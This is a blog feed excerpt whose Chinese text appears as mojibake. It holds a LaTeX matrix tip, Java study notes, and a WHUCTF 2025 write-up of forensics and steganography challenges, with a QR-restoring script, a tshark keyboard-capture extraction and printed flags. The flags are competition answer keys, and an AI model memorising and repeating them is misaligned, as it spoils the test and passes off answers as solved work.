true</span>&#125;</span><span class="language-xml"><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">Â  Â  Â  Â  ],</span></span><br><span class="language-javascript"><span class="language-xml">Â  Â  Â  Â  Â  <span class="hljs-comment">// â€¢ rendering keys, e.g.:</span></span></span><br><span class="language-javascript"><span class="language-xml">Â  Â  Â  Â  throwOnError : <span class="hljs-literal">false</span></span></span><br><span class="language-javascript"><span class="language-xml">Â  Â  Â  Â  &#125;);</span></span><br><span class="language-javascript"><span class="language-xml">Â  Â  &#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br>`, <span class="hljs-string">&#x27;default&#x27;</span>);<br></code></pre></td></tr></table></figure><ul><li>æ³¨æ„ï¼Œåœ¨ä½¿ç”¨çŸ©é˜µæ—¶ï¼Œå¤–éƒ¨å¯ç”¨<code>&lt;sapn&gt;&lt;/sapn&gt;</code> æˆ–<code>&lt;div&gt;&lt;/div&gt;</code>åŒ…è£¹ï¼Œä»¥è§£å†³<code>\\</code>çš„è½¬ä¹‰é—®é¢˜ã€‚</li></ul><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livescript">&lt;span&gt;<br>$$<br> <span class="hljs-string">\begin&#123;bmatrix&#125;</span><br><span class="hljs-number">2</span> &amp; <span class="hljs-number">0</span> &amp; <span class="hljs-number">0</span> &amp; <span class="hljs-string">\cdots</span> &amp; m_1<span class="hljs-string">\\</span><br><span class="hljs-number">0</span> &amp; <span class="hljs-number">2</span> &amp; <span class="hljs-number">0</span> &amp; <span class="hljs-string">\cdots</span> &amp; m_2<span class="hljs-string">\\</span><br><span class="hljs-number">0</span> &amp; <span class="hljs-number">0</span> &amp; <span class="hljs-number">2</span> &amp; <span class="hljs-string">\cdots</span> &amp; m_3<span class="hljs-string">\\</span><br><span class="hljs-string">\vdots</span> &amp; <span class="hljs-string">\vdots</span> &amp; <span class="hljs-string">\vdots</span> &amp; <span class="hljs-string">\ddots</span> &amp; <span class="hljs-string">\vdots\\</span><br><span class="hljs-number">1</span> &amp; <span class="hljs-number">1</span> &amp; <span class="hljs-number">1</span> &amp; <span class="hljs-string">\cdots</span> &amp; <span class="hljs-number">1</span><span class="hljs-string">\\</span><br><span class="hljs-string">\end&#123;bmatrix&#125;</span><br>$$<br>&lt;/span&gt;<br></code></pre></td></tr></table></figure><p>æœªåŠ <code>&lt;span&gt;&lt;/span&gt;</code>:</p><p>$$<br>\begin{bmatrix}<br>2 &amp; 0 &amp; 0 &amp; \cdots &amp; m_1\<br>0 &amp; 2 &amp; 0 &amp; \cdots &amp; m_2\<br>0 &amp; 0 &amp; 2 &amp; \cdots &amp; m_3\<br>\vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots\<br>1 &amp; 1 &amp; 1 &amp; \cdots &amp; 1\<br>\end{bmatrix}<br>$$</p><p>åŠ äº†<code>&lt;span&gt;&lt;/span&gt;</code>:</p><span>$$ \begin{bmatrix}2 & 0 & 0 & \cdots & m_1\\0 & 2 & 0 & \cdots & m_2\\0 & 0 & 2 & \cdots & m_3\\\vdots & \vdots & \vdots & \ddots & \vdots\\1 & 1 & 1 & \cdots & 1\\\end{bmatrix}$$</span><p>å…¶å®è¿™é‡Œä¹Ÿå¯ä»¥ç”¨<code>\newline</code>æ¥æ¢è¡Œï¼Œè¿™æ ·å°±ä¸å­˜åœ¨<code>\\</code>çš„è½¬ä¹‰é—®é¢˜äº†ï¼š<br>$$<br> \begin{bmatrix}<br>2 &amp; 0 &amp; 0 &amp; \cdots &amp; m_1\newline<br>0 &amp; 2 &amp; 0 &amp; \cdots &amp; m_2\newline<br>0 &amp; 0 &amp; 2 &amp; \cdots &amp; m_3\newline<br>\vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots\newline<br>1 &amp; 1 &amp; 1 &amp; \cdots &amp; 1\newline<br>\end{bmatrix}<br>$$<br>ä½†æ˜¯åŒæ—¶åˆ›å»ºå¤šä¸ªçŸ©é˜µæ—¶å¯èƒ½ä¼šå‡ºé—®é¢˜ï¼Œæœ€ç¨³å¦¥çš„æ–¹æ³•è¿˜æ˜¯æ‰“ä¸Š <code>&lt;span&gt;&lt;/span&gt;</code>æ ‡ç­¾ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ç¡®å®æ˜¯ä¸ªæŒºåŸå§‹çš„æ–¹æ³•ï¼Œè™½ç„¶å†™çŸ©é˜µæ—¶æœ‰ç‚¹å°éº»çƒ¦ï¼Œä½†ç¡®å®æŒºå¥½ç”¨ï¼Œå¦‚æœä½ æœ‰ä»€ä¹ˆæ›´å¥½çš„æ–¹æ³•ï¼Œå¯ç”¨å‘Šè¯‰æˆ‘ï¼Œæœ‰ä»€ä¹ˆé—®é¢˜ä¹Ÿæ¬¢è¿æå‡ºã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.kevinchu.top/2023/09/12/hexo-supports-latex/">Hexoæ”¯æŒLaTeXæ•°å­¦å…¬å¼æ¸²æŸ“ - KEVINâ€™S BLOG (kevinchu.top)</a></p>]]></content>
    
    
    <categories>
      
      <category>blog</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
      <tag>latex</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå­¦ä¹ è®°å½•</title>
    <link href="/2025/04/02/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/04/02/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="1-æ¦‚è¿°"><a href="#1-æ¦‚è¿°" class="headerlink" title="1.æ¦‚è¿°"></a>1.æ¦‚è¿°</h1><p><strong>åå­—ç”±æ¥ï¼š</strong> å°åº¦å°¼è¥¿äºšä¸€ä¸ªç››äº§å’–å•¡çš„å²›åã€‚<br><strong>ç‰¹ç‚¹ï¼š</strong> Javaæ˜¯ä¸€ç§ç®€å•çš„ã€é¢å‘å¯¹è±¡çš„ã€åˆ†å¸ƒå¼çš„ã€å¼ºå£®çš„ã€å®‰å…¨çš„ã€ä½“ç³»ç»“æ„ä¸­ç«‹çš„ã€å¯ç§»æ¤çš„ã€é«˜æ€§èƒ½çš„ã€å¤šçº¿ç¨‹çš„å’ŒåŠ¨æ€çš„è¯­è¨€ã€‚<br><strong>ä¸‹è½½ï¼š</strong></p><ul><li>JDK</li><li>ç¼–è¾‘å™¨<br><strong>JDKç¯å¢ƒå·¥å…·ï¼š</strong></li><li><strong>ç¼–è¯‘å™¨-javacï¼š</strong> å°†æºç¨‹åºï¼ˆ.javaæ–‡ä»¶ï¼‰ç¼–è¯‘æˆå­—èŠ‚ç ï¼ˆ.classæ–‡ä»¶ï¼‰ã€‚è°ƒç”¨æ ¼å¼ä¸º<code>javac [é€‰é¡¹] æºæ–‡ä»¶åè¡¨</code></li><li><strong>è¯­è¨€è§£é‡Šå™¨-javaï¼š</strong> è§£é‡Šæ‰§è¡ŒJavaå­—èŠ‚ç ï¼Œæ ¼å¼ä¸º<code>java [é€‰é¡¹]&lt;ç±»å&gt;[å‚æ•°è¡¨]</code></li><li><strong>äº¤äº’å¼å‘½ä»¤è¡Œ-jshell</strong></li></ul><h2 id="å…·æœ‰è¾“å…¥åŠŸèƒ½çš„ç¨‹åº"><a href="#å…·æœ‰è¾“å…¥åŠŸèƒ½çš„ç¨‹åº" class="headerlink" title="å…·æœ‰è¾“å…¥åŠŸèƒ½çš„ç¨‹åº"></a>å…·æœ‰è¾“å…¥åŠŸèƒ½çš„ç¨‹åº</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SayHelloToYou</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException<br>    &#123;<br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in);<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(reader);<br>        System.out.print(<span class="hljs-string">&quot;Enter your name:&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> input.readLine();<br>        System.out.println(<span class="hljs-string">&quot;Hello,&quot;</span> + name + <span class="hljs-string">&quot;!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¿è¡Œç»“æœï¼š</strong><br><img src="/2025/04/02/Java%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250424103740837.png"><br><strong>ä»£ç è§£é‡Šï¼š</strong></p><ul><li><code>import java.io.*:</code>å­¦è¿‡pythonçš„éƒ½çŸ¥é“è¿™æ˜¯å¯¼å…¥åŒ…ï¼Œå¯¼å…¥<code>java.io</code>ä¸­çš„æ‰€æœ‰ç±»ï¼Œä¸Šè¿°ä»£ç ä¸­åŒ…å«åœ¨è¯¥åŒ…ä¸­çš„æœ‰<code>InputStreamReader</code>,<code>BufferedReader</code>,<code>IOException</code></li><li><code>IOException:</code>è¾“å…¥è¾“å‡ºé”™è¯¯æ—¶ä¼šæŠ›å‡º<code>IOException</code>å¼‚å¸¸</li><li><code>InputStreamReader:</code>æ¡¥æ¥å™¨ï¼Œå°†å­—èŠ‚æ•°æ®è§£ç ä¸ºå­—ç¬¦æ•°æ®</li><li><code>InputStreamReader:</code>è£…é¥°å™¨ï¼Œæä¾›ä¸€ä¸ªç¼“å†²åŒºï¼Œèƒ½åŒæ—¶ä»å­—ç¬¦è¾“å…¥æµä¸­è¯»å–å¤šä¸ªå­—ç¬¦åˆ°ç¼“å†²åŒºï¼Œæé«˜è¯»å–æ•ˆç‡ã€‚æä¾›äº†<code>readline()</code>ç­‰æ–¹æ³•ã€‚</li><li><code>print</code>å’Œ<code>println</code>åŒºåˆ«ï¼šå‰è€…æ²¡æœ‰è‡ªåŠ¨æ¢è¡Œï¼Œåè€…æœ‰ã€‚</li></ul><h2 id="ä¹¦å†™è§„èŒƒ"><a href="#ä¹¦å†™è§„èŒƒ" class="headerlink" title="ä¹¦å†™è§„èŒƒ"></a>ä¹¦å†™è§„èŒƒ</h2><h3 id="å‘½åè§„èŒƒï¼š"><a href="#å‘½åè§„èŒƒï¼š" class="headerlink" title="å‘½åè§„èŒƒï¼š"></a>å‘½åè§„èŒƒï¼š</h3><ul><li><strong>åŒ…åï¼š</strong> å…¨éƒ¨å°å†™ï¼Œå¦‚io,awt</li><li><strong>ç±»åï¼š</strong> é¦–å­—æ¯å¤§å†™ï¼Œå¦‚Hello</li><li><strong>å˜é‡åï¼š</strong> é¦–å­—æ¯å°å†™ï¼Œå¦‚userName</li><li><strong>æ–¹æ³•åï¼š</strong> é¦–å­—æ¯å°å†™ï¼Œå¦‚setName</li></ul>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WHUCTF2025 WP</title>
    <link href="/2025/03/31/WHUCTF%202025-WP/"/>
    <url>/2025/03/31/WHUCTF%202025-WP/</url>
    
    <content type="html"><![CDATA[<h1 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ç­¾åˆ°-ç›Šæ™ºæ¸¸æˆ"><a href="#ç­¾åˆ°-ç›Šæ™ºæ¸¸æˆ" class="headerlink" title="[ç­¾åˆ°]ç›Šæ™ºæ¸¸æˆ"></a>[ç­¾åˆ°]ç›Šæ™ºæ¸¸æˆ</h3><p><strong>1.æ•°ç‹¬</strong></p><p>æ•°ç‹¬è¿˜æ²¡åšå®Œï¼Œç›´æ¥çˆ†ç ´å°±å‡ºäº†ã€‚</p><p><img src="/2025/03/31/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-31%20002907.png"></p><p>å¾—åˆ°<code>WHUCTF&#123;Little_games_reall</code></p><p><strong>2.æ•°ç»‡</strong></p><p>é˜Ÿå‹å¾ˆå¼ºï¼Œç›´æ¥æ‰‹æ“äº†ã€‚</p><p><img src="/2025/03/31/WHUCTF%202025-WP/85d0624f43dd995308622fd597fe31cc.jpg"></p><p>å¾—åˆ°<code>y_train_your_brain_&amp;_play</code></p><p><strong>3.é¬¼è„šå›¾</strong></p><p>ç›´æ¥ç™½ç»™äº†ã€‚ã€‚ã€‚</p><p>å¾—åˆ°<code>_more_in_cn.puzzle_website&#125;</code></p><h3 id="å“ªé‡Œæœ‰æ–‡æ¡£"><a href="#å“ªé‡Œæœ‰æ–‡æ¡£" class="headerlink" title="å“ªé‡Œæœ‰æ–‡æ¡£"></a>å“ªé‡Œæœ‰æ–‡æ¡£</h3><p>é™„ä»¶æ˜¯ä¸€ä¸ªdocxæ–‡æ¡£ï¼Œè€Œä¸”ç›´æ¥ç»™å‡ºäº†part1ã€‚</p><p><strong>part2ï¼š</strong><code>ctrl+A</code>ä¸€ä¸‹ï¼Œå‘ç°åœ¨æ–‡ç« æœ€åï¼Œæ”¹ä¸€ä¸‹å­—ä½“é¢œè‰²å°±çœ‹åˆ°äº†ã€‚<br><img src="/2025/03/31/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-29%20112623%201.png" alt="|525"></p><p><strong>part3ï¼š</strong><code>ctrl+F</code>ä¸€ä¸‹ï¼Œæœç´¢partï¼Œå‘ç°ä¸€ä¸ªéå¸¸éšç§˜çš„æ–‡æœ¬æ¡†ï¼Œæ”¾å¤§ä¸€ä¸‹ï¼Œæ‰¾åˆ°part3<br><img src="/2025/03/31/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-31%20004431.png" alt="|525"><br><strong>part4ï¼š</strong> ç”±äºdocxæ–‡æ¡£æœ¬è´¨æ˜¯å‹ç¼©åŒ…ï¼Œå¯ä»¥è§£å‹å‡ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåœ¨<code>docprops</code>æ–‡ä»¶å¤¹ä¸‹è¾¹çš„<code>custom</code>æ–‡ä»¶ä¸­å‘ç°part4.<br><img src="/2025/03/31/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-31%20004633.png"><br><strong>part5ï¼š</strong> åœ¨<code>word</code>æ–‡ä»¶å¤¹ä¸‹è¾¹çš„<code>vbaProject.bin</code>æ–‡ä»¶ä¸­å‘ç°éç–‘ä¼¼part5çš„å­—ç¬¦ä¸²ï¼Œåæ¥è¯•äº†ä¸€ä¸‹è¿˜çœŸæ˜¯ã€‚<br><img src="/2025/03/31/WHUCTF%202025-WP/_posts/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-31%20004817.png"><br><strong>è§£å¯†å™¨ï¼š</strong> åœ¨æ–‡æ¡£é¡µè„šçš„åœ°æ–¹å‘ç°æœ‰ä¸œè¥¿ï¼Œæ¢ä¸€ä¸‹å­—ä½“é¢œè‰²ä¾¿å‘ç°ï¼Œ<code>by Abracadabra encoder</code>ï¼Œä¸Šç½‘æœç´¢ä¹‹åå‘ç°æ˜¯é­”æ›°ã€‚</p><p><strong>è§£å¯†æ­¥éª¤ï¼š</strong> å°†5æ®µpartæ‹¼æ¥åè¿›è¡Œbase64è§£ç ï¼Œå¾—åˆ°ä¸€æ®µæ–‡å­—ï¼Œ</p><p><code>é¹æ— å±€ï¼Œæ— ä»¥è‡´å¤©ï¼Œå…‰æœ‰èƒ½å¬ï¼Œç«¹æœ‰å–„ç„¶ï¼Œè™½æ— æ¥¼é¸¢ä¹‹å½°ï¼Œäº¦æŠ¥ä»¥ç•…çœ‹ç€šæ°´ï¼Œæ±‚å°†ä¸å…¶å®¶ï¼Œè€Œä»»æƒ³ä¹°ä»¥æ˜Ÿè€…ï¼Œæ˜Ÿä¹Ÿï¼Œåæ›²ä¹‹é›¨ï¼Œé€‰ä¹‹éœè€Œç§°ä¹‹èŒ¶ä¹Ÿï¼Œå¯’å†°æ‚ è§ï¼Œå†™è€…æ—…ä¹‹ï¼Œå¶æµè€Œæ¸…æ¢¦çœ‹ä¹Ÿï¼ŒæŠ¥åœ¨è¹é¹¤ã€‚</code></p><p>æ”¾åœ¨é­”æ›°è§£ç å™¨ä¸­è§£ç å¾—åˆ°flag</p><p><code>WHUCTF&#123;always_follow_your_heart&#125;</code></p><h3 id="è¡Œæ˜Ÿé˜²å¾¡ç†äº‹ä¼š"><a href="#è¡Œæ˜Ÿé˜²å¾¡ç†äº‹ä¼š" class="headerlink" title="è¡Œæ˜Ÿé˜²å¾¡ç†äº‹ä¼š"></a>è¡Œæ˜Ÿé˜²å¾¡ç†äº‹ä¼š</h3><p>é™„ä»¶ä¸ºä¸€ä¸ªwavéŸ³é¢‘ï¼Œæ”¾åˆ°Audacityä¸­æŸ¥çœ‹æ³¢å½¢å›¾ï¼Œè§‰å¾—ç±»ä¼¼sstvï¼Œæ”¾å…¥RX-SSTVå·¥å…·ä¸­<br><img src="/2025/03/31/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-29%20164824.png" alt="|625"><br>å‘ç°æœ‰å¯†ç <code>2024-YR4</code>ï¼Œè”æƒ³éœ€è¦å¯†ç çš„wavéŸ³é¢‘éšå†™ï¼Œåœ¨Deepsoundä¸­è¾“å…¥å¯†ç åå¾—åˆ°é™„ä»¶ï¼Œè§£å‹åæ˜¯ä¸€ä¸ªå˜å½¢è¿‡çš„äºŒç»´ç å’Œä¸€ä¸ªå˜å½¢è„šæœ¬ã€‚ç¼–å†™æ¢å¤è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotate</span>(<span class="hljs-params">m: <span class="hljs-built_in">int</span>, arr: np.ndarray</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;å°†æ•°ç»„åˆ†å‰²ä¸º m x m å—ï¼Œå¹¶å°†æ¯å—é¡ºæ—¶é’ˆæ—‹è½¬ 90 åº¦&quot;&quot;&quot;</span><br>    h, w = arr.shape<br>    new_arr = np.zeros_like(arr)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, h, m):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, w, m):<br>            block = arr[i:i + m, j:j + m]<br>            rotated_block = np.rot90(block, k=-<span class="hljs-number">1</span>)  <span class="hljs-comment"># é¡ºæ—¶é’ˆæ—‹è½¬90åº¦</span><br>            new_arr[i:i + m, j:j + m] = rotated_block<br><br>    <span class="hljs-keyword">return</span> new_arr<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># è¯»å–å›¾ç‰‡</span><br>    img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;QR_modified.png&quot;</span>).convert(<span class="hljs-string">&quot;L&quot;</span>)<br>    imgarr = (np.array(img) // <span class="hljs-number">255</span>).astype(np.uint8)<br>    imgarr = imgarr[::<span class="hljs-number">18</span>, ::<span class="hljs-number">18</span>]<br><br>    imgarr = rotate(<span class="hljs-number">5</span>, imgarr)<br><br>    <span class="hljs-comment"># ä¿å­˜å›¾ç‰‡</span><br>    newimgarr = np.kron(imgarr, np.ones((<span class="hljs-number">18</span>, <span class="hljs-number">18</span>)))<br>    newimg = Image.fromarray(newimgarr * <span class="hljs-number">255</span>).convert(<span class="hljs-string">&quot;L&quot;</span>)<br>    newimg.save(<span class="hljs-string">&quot;QR.png&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å›¾ç‰‡å·²ä¿å­˜ä¸º QR.png&quot;</span>)<br><span class="hljs-comment">#WHUCTF&#123;much_ado_about_nothing&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/03/31/WHUCTF%202025-WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-29%20171521.png" alt="|225"><br>æ‰«ç å¾—åˆ°flagã€‚</p><h3 id="é’è½´è¿˜æ˜¯çº¢è½´"><a href="#é’è½´è¿˜æ˜¯çº¢è½´" class="headerlink" title="é’è½´è¿˜æ˜¯çº¢è½´"></a>é’è½´è¿˜æ˜¯çº¢è½´</h3><p>wiresharkæ‰“å¼€é™„ä»¶ï¼Œå‘ç°å…¨æ˜¯USBåè®®æµé‡ï¼Œç»“åˆé¢˜ç›®çŒœæµ‹æ˜¯é”®ç›˜æµé‡ã€‚</p><p>åœ¨kaliä¸­ä½¿ç”¨tsharkæå–é”®ç›˜æµé‡</p><p><code>tshark -r raw_keyboard.pcapng -T fields -e usbhid.data &gt; usbdata.txt</code></p><p>ç„¶åç”¨è„šæœ¬å¯¹æå–å‡ºçš„æµé‡è¿›è¡Œå¤„ç†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>,<br>            <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,<br>            <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>            <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>            <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>,<br>            <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>            <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span 